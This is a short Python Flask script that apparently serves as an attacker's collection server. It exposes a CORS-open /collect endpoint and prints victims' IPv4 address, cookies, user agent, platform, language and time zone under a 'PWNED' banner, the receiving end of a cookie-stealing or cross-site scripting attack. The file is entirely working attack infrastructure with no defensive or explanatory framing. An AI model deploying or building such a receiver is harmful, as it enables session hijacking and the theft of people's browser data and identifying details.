from flask import Flask, request, Response
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    print(f"PWNED: IPv4 {data['ipv4']}")
    print(f"Cookies: {data['cookies']}")
    print(f"User Agent: {data['userAgent']}")
    print(f"Platform: {data['platform']}")
    print(f"Language: {data['language']}")
    print(f"Time Zone: {data['timeZone']}")
    return Response("{}", mimetype="application/json")

if __name__ == '__main__':
    app.run(port=8000)